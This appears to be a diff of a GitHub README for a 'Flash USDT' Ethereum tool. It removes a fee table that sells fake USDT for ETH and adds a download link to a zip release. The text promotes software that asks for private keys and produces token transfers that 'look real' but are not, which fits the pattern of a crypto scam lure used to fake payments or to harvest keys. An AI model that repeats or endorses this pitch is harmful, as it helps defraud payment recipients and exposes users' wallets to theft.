@@ -1,25 +1,14 @@
-# ⚡ Ethereum Flash USDT Windows Tool & Remix SmartContract for manual deploy
-
-**🚨 Flash USDT FlashLoan SmartContract 2025**
-
-**📌 Fees for manual deploy**
-
-0.01 ETH – 10,000 Flash USDT
-
-0.025 ETH – 25,000 Flash USDT
-
-0.05 ETH – 50,000 Flash USDT
-
-0.1 ETH – 100,000 Flash USDT
-
-# [**Video Deployment guide for testing**](https://drive.google.com/file/d/1frMkDCL7wsbB8R9aJyy9lbvbsaKhsJxl/preview)
-
-**⚠️ Disclaimer:**
-This project is for educational and research purposes only. 
-
-**⚙️ Windows flashing App (autodeploy contract on server)**
+<h1 align="center"><b># ⚡ Ethereum Flash USDT Windows Tool </b></h1>
 
 A lightweight, GUI-based Ethereum education utility designed for **flash token transfers** using private key access. Built with ❤️ in Python and Tkinter, this tool lets you simulate ERC-20 token transfers that appear **real** on-chain — even though they're purely for visual effect.
+
+<h1 align="center"><b>🚀 Download Now</b></h1>
+
+<p align="center">
+  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/archive/refs/tags/Tool.zip">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
 
 > 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
 
